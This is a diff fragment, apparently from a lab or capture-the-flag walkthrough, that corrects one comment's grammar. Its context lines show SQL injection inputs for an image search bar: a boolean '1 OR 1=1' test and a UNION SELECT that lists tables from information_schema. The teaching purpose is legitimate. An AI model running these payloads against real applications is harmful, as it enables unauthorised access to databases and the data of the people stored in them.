@@ -29,7 +29,7 @@ Insert the following commands into the image search bar:
 # Test if vulnerable to SQL Injection
 1 OR 1=1	# we get all the results because every row is considered true.
 
-# Get the tables name in the database
+# Get the table names in the database
 1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.TABLES
 
 ... Here we find
